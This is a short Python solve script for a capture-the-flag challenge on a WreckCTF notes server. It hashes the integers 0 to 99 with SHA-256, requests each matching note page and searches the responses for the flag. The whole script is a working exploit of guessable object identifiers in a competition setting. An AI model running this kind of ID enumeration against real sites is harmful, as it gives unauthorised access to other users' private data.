#! /usr/bin/env python3
import hashlib
import colorama
import requests
class solver:
      def __init__(self,text: str):
          self.text = str(text)
      def hashCreate(self):
          text = self.text
          hash = hashlib.sha256(text.encode())
          hash = hash.digest().hex()
          return hash
class load:
      @staticmethod
      def loadPage(idHash):
          url = f"https://notes-1.challs.wreckctf.com/view/{idHash}"
          response = requests.get(url).content.decode()
          if "flag{" in response:
              print("[+]Flag found....")
              preflag = response.split("flag{")[1].split("}")[0]
              flag = f"flag{{{preflag}}}"
              print(f"[+]The flag is {flag}")
              exit()
          else:
              print("[+]Flag not in this user's note")
if __name__ == "__main__":
   for i in range(100):
       solverx = solver(i)
       idHasH = solverx.hashCreate()
       load.loadPage(idHasH)
